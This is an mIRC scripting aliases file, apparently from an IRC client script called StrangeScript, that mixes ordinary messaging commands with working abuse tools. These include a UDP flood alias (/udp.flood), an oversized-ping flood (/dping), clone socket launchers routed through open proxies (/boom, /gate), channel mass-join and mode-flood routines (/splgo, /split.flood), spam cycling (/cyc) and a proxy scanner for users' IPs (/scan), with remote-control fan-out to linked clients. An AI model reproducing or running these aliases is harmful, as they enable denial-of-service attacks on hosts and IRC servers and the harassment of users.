[aliases]
n0=/msg {
n1=  if ($1 == $null) { $report(Msg,No destination sent).active | halt }
n2=  if ($2 == $null) { $report(Msg,No text sent).active | halt }
n3=  if (=* iswm $1) { msg $1- | return }
n4=  keywrite settings attempt.WHISPER 0
n5=  .raw privmsg $1 : $+ $2-
n6=  if ($show == $true) {
n7=    if ($chr(35) isin $1) && ($chan($1) != $null) { echo -t $1 $output  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $2- | return }
n8=    if ($chr(35) !isin $1) && ($query($1) != $null) { echo -t $1 $output  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $2- | return }
n9=    if ($chr(35) !isin $1) && ($query($1) == $null) { $report(Privmsg to $1,$null,--->,$2-).active }
n10=    return 
n11=  }
n12=}
n13=/aamsg { scid -a amsg $1- }
n14=/amsg {
n15=  if ($1 == $null) { $report(Msg,No text sent).active | halt }
n16=  if ($chan(0) < 1) { return }
n17=  var %amsg.count = 1
n18=  while (%amsg.count <= $chan(0)) {
n19=    .raw privmsg $chan(%amsg.count) : $+ $1-
n20=    if ($show == $true) { echo -t $chan(%amsg.count) $output  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $1- }
n21=    var %amsg = $addtok(%amsg,$chan(%amsg.count),44)
n22=    inc %amsg.count
n23=    if (%amsg.count > $chan(0)) { break }
n24=  }
n25=  return
n26=}
n27=/me {
n28=  if (=* iswm $active) { describe $active $1- | return }
n29=  .raw privmsg $active : $+ ACTION $1- $+ 
n30=  if ($show == $true) { echo $color(action) -t $active Action:  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $1- }
n31=  return
n32=}
n33=/aame { scid -a ame $1- }
n34=/ame {
n35=  var %n = 1
n36=  while (%n <= $chan(0)) {
n37=    .raw privmsg $chan(%n) : $+ ACTION $1- $+  
n38=    if ($show == $true) { echo $color(action) -t $chan(%n) Action:  $+ %sc.me $+ $lll $+ $white $me  $+ %sc.me $+ $rrr $+  $1- }
n39=    inc %n
n40=    if (%n > $chan(0)) { break }
n41=  }
n42=  return
n43=}
n44=/spl {
n45=  if ($master(settings,remotecontrol.send) == ON) {
n46=    var %xXx = 0
n47=    while (%xXx <= 9) {
n48=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .cmd spl $1 }
n49=      inc %xXx
n50=      if (%xXx > 9) { break }
n51=    } 
n52=  }
n53=  if ($1 == OFF) { .timerSPL. $+ $network OFF | $report(Make Split,Split Timer,OFF).active | $report(Make Split,Final room count,%spl.count,rooms in,$duration($calc($ctime - %spl.start))).active | unset %spl.count %spl.start %splgo.count | return }
n54=  if ($1 == COUNT) { $report(Make Split,Current room count,%spl.count,rooms in,$duration($calc($ctime - %spl.start))).active | return }
n55=  if ($1 != $null) {
n56=    if ($1 !isnum) { $report(Make Split,$null,$null,The param must be a munber in seconds, between room joins,You sent ,$1).active | return }
n57=    if ($timer(spl. [ $+ [ $network ] ] ).com != $null) { .timerSPL. $+ $network 0 $1 splgo | $report(Make Split,Split Timer,Active,Updating to,$1, seconds).active | return }
n58=    if ($timer(spl. [ $+ [ $network ] ] ).com == $null) { set %spl.count 0 | set %spl.start $ctime | .timerSPL. $+ $network 0 $1 splgo | $report(Make Split,Split Timer,Activated,Using delay,$1, seconds).active | return }
n59=  }
n60=  else {
n61=    if ($timer(spl. [ $+ [ $network ] ] ).com != $null) { $report(Make Split,Split timer,Active,With a delay of,$timer(spl. [ $+ [ $network ] ] ).delay).active }
n62=    if ($timer(spl. [ $+ [ $network ] ] ).com == $null) { $report(Make Split,$null,$null,$null,Split timer is not active).active }
n63=    $report(Make Split,$null,$null,You must include "seconds between sends" on the command line.).active
n64=    return
n65=  }
n66=}
n67=/saysplit { msg # $report(Split Channels,$null,$null,$null,%split.chan) }
n68=/splgo {
n69=  var %tmp11 1
n70=  while (%tmp11 <= $sock(*,0)) {
n71=    if (@Boom isin $sock(*,%tmp11)) || (@Gate isin $sock(*,%tmp11)) || (@Split isin $sock(*,%tmp11)) {
n72=      var %test $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999) $+ , $+ $chr(35) $+ A $+ $rand(0,999999999)
n73=      sockwrite -n $sock(*,%tmp11) join %test
n74=      sockwrite -n $sock(*,%tmp11) part %test
n75=      inc %spl.count 10
n76=    }
n77=    inc %tmp11
n78=    if (%tmp11 > $sock(*,0)) { break }
n79=  }
n80=  $report(Make Split,%spl.count,$duration($calc($ctime - %spl.start)),Per Minute,$round($calc(%spl.count / (($ctime - %spl.start) / 60)),0)).status
n81=}
n82=/newkey return StrangeScript $+ $chr(91) $+ $rand(0,99999) $+ $rand(A,Z) $+ $rand(A,Z) $+ $rand(0,99999) $+ $chr(93)
n83=/addkey {
n84=  if ($key(settings,rumble) == ON) { return }
n85=  ;if ($key(settings,ircx) == OFF) { return }
n86=  if ($1 == $null) {
n87=    if ($key(#,deop) == ON) { .raw prop # ownerkey : $+ $key(#,ownerkey)  }
n88=    elseif ($key(#,deop) == PROTECT) { .raw prop # ownerkey : $+ $key(#,ownerkey)  }
n89=    else { keywrite # ownerkey $newkey | .raw prop # ownerkey : $+ $key(#,ownerkey) }
n90=  }
n91=  if ($1 != $null) {
n92=    if ($key($1,deop) == ON) { .raw prop $1 ownerkey : $+ $key($1,ownerkey)  }
n93=    elseif ($key($1,deop) == PROTECT) { .raw prop $1 ownerkey : $+ $key($1,ownerkey)  }
n94=    else { keywrite $1 ownerkey $newkey | .raw prop $1 ownerkey : $+ $key($1,ownerkey) }
n95=  }
n96=  return
n97=}
n98=/addme {
n99=  if ($key(settings,rumble) == ON) { return }
n100=  if ($key(settings,ircx) == OFF) { return }
n101=  if ($1 == $null) { .raw access # add owner $address($me,4) 0 : $+ $ver }
n102=  else {
n103=    if ($1 == all) { addme.all }
n104=    else { .raw access $1 add owner $address($me,4) 0 : $+ $ver }
n105=  }
n106=}
n107=/addme2 {
n108=  if ($key(settings,rumble) == ON) { return }
n109=  if ($key(settings,ircx) == OFF) { return }
n110=  if ($1 == $null) { .raw access # add host $address($me,4) 0 : $+ $ver }
n111=  else {
n112=    if ($1 == all) { addme.all }
n113=    else { .raw access $1 add host $address($me,4) 0 : $+ $ver }
n114=  }
n115=}
n116=/addme.all {
n117=  if ($key(settings,rumble) == ON) { return }
n118=  if ($key(settings,ircx) == OFF) { return }
n119=  var %tmp. 1
n120=  while (%tmp.adjust <= $chan(0)) {
n121=    if ($nick($chan(%tmp.adjust),$me,q) != $null) { addme $chan(%tmp.adjust) }
n122=    if ($nick($chan(%tmp.adjust),$me,o) != $null) { addme2 $chan(%tmp.adjust) }
n123=    inc %tmp.adjust
n124=    if (%tmp.adjust > $chan(0)) { break }
n125=  }
n126=}
n127=/cyc {
n128=  if ($1 == OFF) { timerCYC off | return }
n129=  if ($1 == $null) {
n130=    var %tmp.cyc $$?="Seconds between sends"
n131=    var %tmp.cyc1 %tmp.cyc $?!="Do you want it to cycle?"
n132=    var %tmp.cyc3 $?="What Channel? $+ $cr $+ OK for Current"
n133=    if (%tmp.cyc3 == $null) { var %tmp.cyc3 = # }
n134=    timerCYC 0 %tmp.cyc cyc %tmp.cyc1 %tmp.cyc3
n135=  }
n136=  if ($1 != $null) {
n137=    if ($2 == $true) {
n138=      var %tmp.cf 1
n139=      while (%tmp.cf <= $sock(*,0)) {
n140=        if ( @Boom isin $sock(*,%tmp.cf)) || (@Gate isin $sock(*,%tmp.cf)) || (@Split isin $sock(*,%tmp.cf)) { sockwrite -n $sock(*,%tmp.cf) join $3 $+ $cr $+ privmsg $3 : $+  $+ $rand(0,15) $+ $str(XoX,130) $+ $cr $+ part $3 }
n141=        inc %tmp.cf
n142=        if (%tmp.cf > $sock(*,0)) { break }
n143=      }
n144=    }
n145=  }
n146=  if ($2 == $false) {
n147=    var %tmp.cf 1
n148=    while (%tmp.cf <= $sock(*,0)) {
n149=      sockwrite -n $sock(*,%tmp.cf) privmsg $3 : $+  $+ $rand(0,15) $+ $str(SeX,130)
n150=      inc %tmp.cf
n151=      if (%tmp.cf > $sock(*,0)) { break }
n152=    }
n153=  }
n154=}
n155=/boot { raw mode # -o-o-o-o-o-o $1 $1 $1 $1 $1 $1 $+ $cr $+ kick # $1 SpakkerHead }
n156=/blitz { .raw part # $crlf join # $crlf part # $crlf join # $crlf part # $crlf join # $crlf part # $crlf join # $key(#,ownerkey) }
n157=sysop.menu { return SysOp Menu }
n158=/dos { if ($OS == XP) || ($os == 2K) { run cmd.exe } | else { run command.com } }
n159=/telnet {
n160=  if ($1 == $null) {
n161=    var %ttmp = $input(IP to telnet to?,egi,StrangeScript needs input,127.0.0.1)
n162=    if (%ttmp == $null) { halt }
n163=    run telnet %ttmp
n164=  }
n165=  else { run telnet $1- }
n166=}
n167=/http { www $1- }
n168=/www {
n169=  ;if ($1 == $null) {
n170=  ;  var %htmp = $input(IP to telnet to?,egi,StrangeScript needs input,127.0.0.1)
n171=  ;  if (%htmp == $null) { halt }
n172=  ;  run %htmp
n173=  ;}
n174=  if (http* !isin $1-) {
n175=    if (*www* !isin $1-) { run http://www. $+ $1- } 
n176=    { run http:// $+ $1- | halt }
n177=  }
n178=}
n179=/ftp {
n180=  if ($1 == $null) {
n181=    var %ttmp = $input(IP to ftp to?,egi,StrangeScript needs input,127.0.0.1)
n182=    if (%ttmp == $null) { halt }
n183=    run ftp %ttmp
n184=  }
n185=  else { run ftp $1- }
n186=}
n187=/udp.flood { sockudp -nk * $1 $rand(1,5000) ||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||||| }
n188=/script.play {
n189=  if ($master(settings,script.sound) != ON) { return }
n190=  if ($right($1-,3) == wav) {
n191=    if ($inwave != $true) { splay -w $1- }
n192=  }
n193=  if ($right($1-,3) == mp3) || ($right($1-,3) == wma) {
n194=    if ($insong != $true) { splay -p $1- }
n195=  }
n196=  ;$report(Playing a *. $+ $upper($right($1,3)) sound file).status
n197=  return
n198=}
n199=/unshit {
n200=  keywrite settings shithead
n201=  keywrite settings shitheadlast
n202=  rumble OFF
n203=  $report(ShitList,CLEAR,$null,The list has been cleared).active
n204=  if ($key(settings,shithead) == $null) { $report(ShitList,SHOW,$null,The current Shit List is EMPTY).active }
n205=  if ($key(settings,shithead) != $null) { $report(ShitList,SHOW,$null,The current Shit List is $replace($key(settings,shithead),$chr(44),$chr(160))).active }
n206=}
n207=/shit {
n208=  if ($key(settings,shitheadlast) == $null) { 
n209=    $report(Last ShitList,EMPTY,$null,No action taken).active
n210=    if ($key(settings,shithead) == $null) { $report(ShitList,SHOW,$null,The current Shit List is EMPTY).active }
n211=    if ($key(settings,shithead) != $null) { $report(ShitList,SHOW,$null,The current Shit List is $replace($key(settings,shithead),$chr(44),$chr(160))).active }
n212=    rumble OFF
n213=    return
n214=  }
n215=  if ($key(settings,shitheadlast) != $null) { 
n216=    keywrite settings shithead $remtok($key(settings,shithead),$key(settings,shitheadlast),1,44)
n217=    $report(Last ShitList,REMOVE,$null,The ip $key(settings,shitheadlast) was removed).active
n218=    if ($key(settings,shithead) == $null) { $report(ShitList,SHOW,$null,The current Shit List is EMPTY).active }
n219=    if ($key(settings,shithead) != $null) { $report(ShitList,SHOW,$null,The current Shit List is $replace($key(settings,shithead),$chr(44),$chr(160))).active }
n220=    keywrite settings shitheadlast
n221=    rumble OFF
n222=    return
n223=  }
n224=}
n225=/split.flood {
n226=  if ($1 == $null) { $report(ERROR in Split.Flood).active | return }
n227=  set %tmp.splitflood 1
n228=  while (%tmp.splitflood <= $sock(*,0)) {
n229=    if (%tmp.splitflood.tic == ON) { set %tmp.splitflood.tic OFF }
n230=    else { set %tmp.splitflood.tic ON }
n231=    if (%tmp.splitflood.tic == OFF) { set %tmp.splitflood.say mode $1 +ntsuw }
n232=    else { set %tmp.splitflood.say mode $1 -ntuw }
n233=    sockwrite -n $sock(*,%tmp.splitflood) %tmp.splitflood.say
n234=    inc %tmp.splitflood
n235=    if (%tmp.splitflood > $sock(*,0)) { break }
n236=  }
n237=  unset %tmp.splitflood %tmp.splitflood
n238=}
n239=/link {
n240=  if ($1 == $null) { set %tmp.link $$?="Nick or IP to link with" }
n241=  if ($1 == $null) && (%tmp.link == $null) { return }
n242=  if ($1 != $null) { set %tmp.link $1- }
n243=  ctcp %tmp.link MultiLink $$?="Password for Link"
n244=  unset %tmp.link
n245=}
n246=/RC.Clear { unset %remote.control* | setupshow RC nicks ALL cleared. | return }
n247=/nick.check {
n248=  if ($key(settings,beme) == ON) {
n249=    if ($key(settings,savednick1) != $null) && ($me != $key(settings,savednick1)) { if ($key(settings,recover) == $null) { recover $key(settings,savednick1) | return } }
n250=  }
n251=  return
n252=}
n253=/launch {
n254=  boom
n255=  .timer 1 30 gate
n256=}
n257=/alt.fix {
n258=  if ($1 != ALL) {
n259=    if ($1 !isnum) { return }
n260=  }
n261=  if ($1 == ALL) {
n262=    if ($1 isnum) { return }
n263=  }
n264=}
n265=/fix {
n266=  if ($1 != $null) {
n267=    $report(Socket Fix,$null,$null,Closing $1 Remote Connection, Window and resetting Variables).status
n268=    if (@Boom !isin $1) && (@Gate !isin $1) { $report(Socket Fix,ERROR,$null,Incorrect command given $1- must be @BoomNUM or @gateNUM).active | return }
n269=    sockclose $1
n270=    window -c $1
n271=    if (@Boom !isin $1) {
n272=      keywrite settings boom.sock.chan
n273=      keywrite settings boom.sock.nick
n274=      unset %boom.server [ $+ [ $1 ] ]
n275=    }
n276=    if (@Gate !isin $1) {
n277=      keywrite settings clone.sock.chan
n278=      keywrite settings clone.sock.nick
n279=      unset %clone.server [ $+ [ $1 ] ]
n280=    }
n281=    return
n282=  }
n283=  if ($1 == $null) {
n284=    $report(Socket Fix,$null,$null,Closing all Boom and Gate Remote Connections).status
n285=    sockclose @Boom*
n286=    sockclose @Gate*
n287=    keywrite settings boom.sock.chan
n288=    keywrite settings boom.sock.nick
n289=    keywrite settings clone.sock.chan
n290=    keywrite settings clone.sock.nick
n291=    unset %boom.server*
n292=    unset %clone.server*
n293=    var %tmp = 1
n294=    while (%tmp <= 999) {
n295=      window -c @Boom [ $+ [ %tmp ] ]
n296=      window -c @Gate [ $+ [ %tmp ] ]
n297=      inc %tmp
n298=      if (%tmp > 999) { break }
n299=    }
n300=  }
n301=  if ($master(settings,remotecontrol.send) == ON) {
n302=    var %xXx = 0
n303=    while (%xXx <= 9) {
n304=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .cmd fix $1 }
n305=      inc %xXx
n306=      if (%xXx > 9) { break }
n307=    } 
n308=  }
n309=  return
n310=}
n311=/boom {
n312=  var %tmp.1 $1 , %tmp.2 $2 , %tmp.3 $3
n313=  ;if (%tmp.1 != $null) && (%tmp.1 !isnum) && (%tmp.2 == $null) { var %tmp.1 2 | var %tmp.2 $network }
n314=  if (%tmp.1 == $null) { var %tmp.1 2 }
n315=  if (%tmp.2 == $null) { var %tmp.2 $bAdd }
n316=  if (%tmp.2 == $null) && (%tmp.2 == $null) { var %tmp.2 $serverip }
n317=  if (%tmp.3 == $null) { var %tmp.3 6667 }
n318=  var %tmp.boom.count 1
n319=  while (%tmp.boom.count <= %tmp.1) {
n320=    if ($sock(@Boom [ $+ [ %tmp.boom.count ] ] ).name == $null) { sockopen @Boom [ $+ [ %tmp.boom.count ] ] %tmp.2 %tmp.3 }
n321=    inc %tmp.boom.count
n322=    if (%tmp.boom.count > %tmp.1) { break }
n323=  }
n324=  if ($master(settings,remotecontrol.send) == ON) {
n325=    var %xXx 0
n326=    while (%xXx <= 9) {
n327=      if (%remote.control [ $+ [ %xXx ] ] != $null) { msg $chr(61) $+ %remote.control [ $+ [ %xXx ] ] .cmd boom %tmp.1 }
n328=      inc %xXx
n329=      if (%xXx > 9) { break }
n330=    } 
n331=  }
n332=  return
n333=}
n334=/Gate.alt {
n335=  set %gate.load $read(Gates.txt,n,$1)
n336=  var %cloneload 1
n337=  $report(Begining @Gate socket load of line $1 %gate.load).active
n338=  ;while (%cloneload <= 1) {
n339=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name != $null) { inc %CloneNum }
n340=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name == $null) { sockopen @Gate $+ %CloneNum %gate.load 23 }
n341=  inc %CloneNum
n342=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name == $null) { sockopen @Gate $+ %CloneNum %gate.load 1080 }
n343=  inc %CloneNum
n344=  if ($sock(@Gate [ $+ [ %CloneNum ] ] ).name == $null) { sockopen @Gate $+ %CloneNum %gate.load 80 }
n345=  inc %CloneNum
n346=  if (%CloneNum > 999) { set %CloneNum 1 }
n347=  inc %cloneload
n348=  if (%cloneload > 1) { break }
n349=  ;}
n350=  $report(Done,$null,$null,Please wait for sockets to load).active
n351=}
n352=/gate {
n353=  ;set %bah.load $lines(Gates.txt)
n354=  if ($1 == $null) { set %CloneNum 1 | var %gatenext 1, %gateloop = $calc(%gatenext +9) }
n355=  if ($1 != $null) { var %gatenext $1 | var %gateloop $calc(%gatenext +9) }
n356=  :next
n357=  while (%gatenext <= %gateloop) {
n358=    .timergate $+ %gatenext 1 $calc(%gatenext * 4) gate.alt %gatenext
n359=    inc %gatenext
n360=    if (%gatenext > %gateloop) { break }
n361=    if (%gatenext > $lines(Gates.txt)) { break }
n362=  }
n363=  set %CloneNum1
n364=  return
n365=}
n366=Parsme {
n367=  if ($window(@NumParse) == $null) { window -l @NumParse 0 408 800 100 @NumParse Arial 12 bold }
n368=  var %pi = 1
n369=  while ($gettok(%Parse,%pi,32) != $null) {
n370=    var %Parsed = %Parsed 10 $+ $chr(91) $+ 04Param $+ %pi $+ : 09 $+ $gettok(%Parse,%pi,32) $+ 10 $+ $chr(93)
n371=    inc %pi
n372=    if ($gettok(%Parse,%pi,32) == $null) { break }
n373=  }
n374=  aline @NumParse %ParseNum %Parsed 
n375=  sline @NumParse $line(@NumParse,0)
n376=}
n377=/dping {
n378=  if ($1 == $null) { run ping -t -l 65500 -v 8 -w 100 $$?="Enter IP to flood:" }
n379=  else { run ping -t -l 65500 -v 8 -w 100 $1 }
n380=}
n381=/end {
n382=  if ($1 == $null) { $report(No range given. /end 1 2 3 or /end 1-21).active | return }
n383=  set %tmp.end $1-
n384=  if ($chr(45) isin %tmp.end) { goto range }
n385=  set %tmp.end.count 1
n386=  while (%tmp.end.count <= $numtok(%tmp.end,32)) {
n387=    stop $gettok(%tmp.end,%tmp.end.count,32)
n388=    inc %tmp.end.count
n389=    if (%tmp.end.count > $numtok(%tmp.end,32)) { break }
n390=  }
n391=  unset %tmp.end %tmp.end.count
n392=  return
n393=  :range
n394=  set %tmp.end $gettok(%tmp.end,1,32)
n395=  set %tmp.end.count $remove($left(%tmp.end,$pos(%tmp.end,-,1)),-)
n396=  while (%tmp.end.count <= $remove($right(%tmp.end,$pos(%tmp.end,-,1)),-)) {
n397=    stop %tmp.end.count
n398=    inc %tmp.end.count
n399=    if (%tmp.end.count > $remove($right(%tmp.end,$pos(%tmp.end,-,1)),-)) { break }
n400=  }
n401=  unset %tmp.end %tmp.end.count
n402=  if ($numtok($1-,32) > 1) { .timer 1 0 end $2- }
n403=}
n404=/so { msg # $report(Sockets's Open,$null,$sock(*,0),$null,$sock(@Boom*,0), Booms, $sock(@Gate*,0), Gates,$sock(@Split*,0), Splits,$calc($sock(*,0) - ($sock(@Boom*,0) + $sock(@Gate*,0) + $sock(@Split*,0))), others) }
n405=/insta.aj {
n406=  $report(Insta-AutoJoin,$null,$null,Creating your autojoin list).active
n407=  var %tmp.iaj = 1
n408=  var %tmp.iaj1 = ""
n409=  while (%tmp.iaj <= $chan(0)) {
n410=    var %tmp.iaj1 = $addtok(%tmp.iaj1,$chan(%tmp.iaj),44)
n411=    $report(Insta-AutoJoin,$null,Adding,$null,$chan(%tmp.iaj)).active
n412=    inc %tmp.iaj
n413=    if (%tmp.iaj > $chan(0)) { break }
n414=  }
n415=  keywrite settings autojoinrooms %tmp.iaj1
n416=  $report(Insta-AutoJoin,$null,Done,%tmp.iaj1).active
n417=}
n418=/reup { set %split.dc off | server internal $1 }
n419=/kall {
n420=  var %tmp.kall = 1
n421=  set %tmp.kst ""
n422=  while (%tmp.kall <= $ialchan($1,#,0)) {
n423=    if ($ialchan($1,#,%tmp.kall).nick != $me) { set %tmp.kst $addtok(%tmp.kst,$ialchan($1,#,%tmp.kall).nick,44) }
n424=    inc %tmp.kall
n425=    if (%tmp.kall > $ialchan($1,#,0)) { break }
n426=  }
n427=  if ($2 == BAN) {
n428=    if ($key(settings,rumble) == ON) { .access # add deny $1 0 : $+ $ver }
n429=    else { .ban # $1 }
n430=    kick # %tmp.kst $1 $+ $chr(160) $+ $chr(160) $+ 10 $+ ( $+ 00IP Ban $+ 10 $+ )
n431=  }
n432=  else { .kick # %tmp.kst $1 $+ $chr(160) $+ 10 $+ ( $+ 00IP Kick $+ 10 $+ ) }
n433=  unset %tmp.kst
n434=  return
n435=}
n436=/adjust {
n437=  if ($key(settings,rumble) == ON) { return }
n438=  clearial
n439=  var %tmp.adjust = 1
n440=  while (%tmp.adjust <= $chan(0)) {
n441=    if ($me isop $chan(%tmp.adjust)) { .who $chan(%tmp.adjust) }
n442=    ;if ($me isop $chan(%tmp.adjust)) && ($nick($chan(%tmp.adjust),0) < 200) { .who $chan(%tmp.adjust) }
n443=    inc %tmp.adjust
n444=    if (%tmp.adjust > $chan(0)) { break }
n445=  }
n446=  $report(IAL,$null,Auto,Updating,All Op Channels).status
n447=  ;.timerlogcolor. $+ $network 1 10 login.color.nick
n448=  .timerMASTER. $+ $network 1 10 auto.master
n449=}
n450=/sl { socklist }
n451=/sc { sockclose $1- }
n452=weapons { if ($exists($mircdirwar) == $true) { return Weapons } }
n453=/scan {
n454=  if ($1 == $me) { halt }
n455=  if ($1 == $null) { $report(Please include the nick and IP /scan <nick> <IP>).active | halt }
n456=  if ($2 == $null) { $report(Please include the nick and IP /scan <nick> <IP>).active | halt }
n457=  if ($chr(64) isin $2) {  
n458=    set %Gate.Usera [ $+ [ %Gate.Scaning.count ] ] $1 $gettok($2,2,64)
n459=    sockopen @sockchecka [ $+ [ %Gate.Scaning.count ] ] $gettok($2,2,64) 1080
n460=    set %Gate.Userb [ $+ [ %Gate.Scaning.count ] ] $1 $gettok($2,2,64)
n461=    sockopen @sockcheckb [ $+ [ %Gate.Scaning.count ] ] $gettok($2,2,64) 23
n462=  }
n463=  if ($chr(64) !isin $2) {  
n464=    set %Gate.Usera [ $+ [ %Gate.Scaning.count ] ] $1 $2
n465=    sockopen @sockchecka [ $+ [ %Gate.Scaning.count ] ] $2 1080
n466=    set %Gate.Userb [ $+ [ %Gate.Scaning.count ] ] $1 $2
n467=    sockopen @sockcheckb [ $+ [ %Gate.Scaning.count ] ] $2 23
n468=  }
n469=  .timerGATEAC $+ %Gate.Scaning.count 1 30 /sockclose @sockchecka [ $+ [ %Gate.Scaning.count ] ]
n470=  .timerGATEAV $+ %Gate.Scaning.count 1 30 /unset %Gate.Usera [ $+ [ %Gate.Scaning.count ] ]
n471=  .timerGATEBC $+ %Gate.Scaning.count 1 30 /sockclose @sockcheckb [ $+ [ %Gate.Scaning.count ] ]
n472=  .timerGATEBV $+ %Gate.Scaning.count 1 30 /unset %Gate.Userb [ $+ [ %Gate.Scaning.count ] ]
n473=  inc %Gate.Scaning.count
n474=  if (%Gate.Scaning.count > 999) { set %Gate.Scaning.count 0 | halt }
n475=}
n476=/system { msg # $report(System Info,Windows $os) $report($null,CPU: 1400 mhz) }
n477=/unkill { keywrite settings killonops.chan "" | keywrite settings killonops.nick "" | $report(Kill,$null,Cleared,$null,Your kill alias has been cleared).active }
n478=custom.filter {
n479=  if ($gettok(%custom.filter,1,44) != $null) && (* $+ $gettok(%custom.filter,1,44) $+ * iswm $strip($1-)) { return $true }
n480=  elseif ($gettok(%custom.filter,2,44) != $null) && (* $+ $gettok(%custom.filter,2,44) $+ * iswm $strip($1-)) { return $true }
n481=  elseif ($gettok(%custom.filter,3,44) != $null) && (* $+ $gettok(%custom.filter,3,44) $+ * iswm $strip($1-)) { return $true }
n482=  elseif ($gettok(%custom.filter,4,44) != $null) && (* $+ $gettok(%custom.filter,4,44) $+ * iswm $strip($1-)) { return $true }
n483=  elseif ($gettok(%custom.filter,5,44) != $null) && (* $+ $gettok(%custom.filter,5,44) $+ * iswm $strip($1-)) { return $true }
n484=  elseif ($gettok(%custom.filter,6,44) != $null) && (* $+ $gettok(%custom.filter,6,44) $+ * iswm $strip($1-)) { return $true }
n485=  elseif ($gettok(%custom.filter,7,44) != $null) && (* $+ $gettok(%custom.filter,7,44) $+ * iswm $strip($1-)) { return $true }
n486=  elseif ($gettok(%custom.filter,8,44) != $null) && (* $+ $gettok(%custom.filter,8,44) $+ * iswm $strip($1-)) { return $true }
n487=  elseif ($gettok(%custom.filter,9,44) != $null) && (* $+ $gettok(%custom.filter,9,44) $+ * iswm $strip($1-)) { return $true }
n488=  else { return $false }
n489=}
n490=ChitChat {
n491=  if ($key(settings,chitchat) == ON) {
n492=    if ($window(@ChitChat) == $null) { window @ChitChat @ChitChat }
n493=    echo -t @ChitChat On $network in $2 $+ , $1 said: $3-
n494=  }
n495=  return
n496=}
n497=/bnc {
n498=  if ($1 != $null) { masterwrite settings bnc.server $1- }
n499=  if ($master(settings,bnc.ip) == $null) { masterwrite settings bnc.ip $input(Enter the BNC IP you want  to connect to,egi,StrangeScript needs input,127.0.0.1) }
n500=  if ($master(settings,bnc.port) == $null) { masterwrite settings bnc.port $input(Enter the BNC Port to connect on,egi,StrangeScript needs input,6667) }
n501=  if ($master(settings,bnc.vhost) == $null) { masterwrite settings bnc.vhost $input(Enter the VHost to use,egi,StrangeScript needs input) }
n502=  if ($master(settings,bnc.keepalive) == $null) { masterwrite settings bnc.keepalive $input(Enable keepalive?,ygi,StrangeScript needs input) }
n503=  if ($master(settings,bnc.pass) == $null) { masterwrite settings bnc.pass $input(Enter the BNC password,pgi,StrangeScript needs input) }
n504=  if ($master(settings,bnc.server) == $null) { masterwrite settings bnc.server $input(Enter the server to head to with the BNC,egi,StrangeScript needs input,127.0.0.1) }
n505=  server $master(settings,bnc.ip) $master(settings,bnc.port)
n506=  $report(Use /bnc2 to send codes and connect info).active
n507=}
n508=/bnc2 {
n509=  if ($master(settings,bnc.use) != ON) { return }
n510=  raw pass $master(settings,bnc.pass)
n511=  if ($master(settings,bnc.keepalive) == $true) { raw keepalive }
n512=  raw vip $master(settings,bnc.vhost)
n513=  raw conn $master(settings,bnc.server)
n514=}
n515=/BNC.Server {
n516=  set %BNC.version StrangeBNC v 1.6
n517=  if ($1 == INFO) {
n518=    var %tmp.b = $sock(BNCUSER*,0)
n519=    if (%tmp.b == $null) { var %tmp.b = 0 }
n520=    $report(BNC,INFO,$null,$null,Listing Information for %BNC.version).active
n521=    $report(BNC,INFO,$null,$null,There is currently %tmp.b connection(s) to the BNC server.).active
n522=    var %tmp.bnci = 1
n523=    while (%tmp.bnci <= $sock(BNCUSER*,0)) {
n524=      $report(BNC,INFO,User %tmp.bnci,%BNC.nick [ $+ [ $right($sock(BNCUSER*,%tmp.bnci),-7) ] ] ,%BNC.user [ $+ [ $right($sock(BNCUSER*,%tmp.bnci),-7) ] ] ).active
n525=      $report(BNC,INFO,User %tmp.bnci,Connected to %BNC.server [ $+ [ $right($sock(BNCUSER*,%tmp.bnci),-7) ] ] ).active
n526=      inc %tmp.bnci
n527=      if (%tmp.bnci > $sock(BNCUSER*,0)) { break }
n528=    }
n529=    return
n530=  }
n531=  if ($master(settings,Sbnc.active) == $null) { masterwrite settings Sbnc.active OFF | setupshow BNC Server offline }
n532=  if ($master(settings,Sbnc.port) == $null) { masterwrite settings Sbnc.port 1000 | setupshow BNC Port $master(settings,Sbnc.port) }
n533=  if ($master(settings,Sbnc.active) == ON) { if ($sock(BNCS) == $null) { socklisten BNCS $master(settings,Sbnc.port) } | set %BNC.count 1 }
n534=  if ($master(settings,Sbnc.active) == OFF) { sockclose BNCS* | sockclose BNCUSER* | sockclose BNCRELAY* | unset %BNC.nick* %BNC.user* %BNC.pass* %BNC.authed* %BNC.level* }
n535=  return
n536=}
n537=;/quote {
n538=;  if ($1 == 1) { quote.text $2- | halt }
n539=;  if ($1 == 2) { quote.clip $2- | halt }
n540=;  else {
n541=;    $report(Quote,$null,Usage:,/quote 1 [Reply to the last chatter]).active
n542=;    $report(Quote,$null,If you don't include a reply on the command line it will ask you for it.).active
n543=;    $report(Quote,$null,Usage:,/quote 2 [Reply to the clipboard contents]).active
n544=;    $report(Quote,$null,Agian if you don't include a reply on the command line it will ask you for it.).active
n545=;    ;quote.text $2-
n546=;    halt
n547=;  }
n548=;}
n549=;/quote.text {
n550=;  if ($1 != $null) { say $report($null,$null,$chr(126) $+ $token(%quote.text. [ $+ [ $network ] ] ,3,46) $+ $chr(126)) 1 $1- | halt }
